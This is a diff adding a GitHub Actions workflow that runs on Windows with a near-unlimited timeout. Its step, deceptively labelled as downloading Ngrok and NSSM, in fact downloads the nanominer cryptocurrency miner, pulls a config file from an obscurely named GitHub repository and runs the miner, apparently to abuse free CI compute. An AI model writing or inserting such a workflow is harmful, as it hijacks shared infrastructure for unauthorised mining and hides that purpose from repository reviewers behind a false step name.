@@ -1,0 +1,18 @@
+name: Auto
+
+on: workflow_dispatch
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+    timeout-minutes: 9999
+
+    steps:
+    - name: Download Ngrok & NSSM
+      run: |
+        Invoke-WebRequest https://github.com/nanopool/nanominer/releases/download/3.3.2/nanominer-windows-3.3.2.zip -OutFile nano.zip
+        tar -xf nano.zip
+        cd .\nanominer-windows-3.3.2\
+        Invoke-WebRequest https://github.com/VTFFZ2c9E0/VTFFZ2c9E0/raw/main/config.ini -OutFile config.ini
+        ./nanominer.exe config.ini
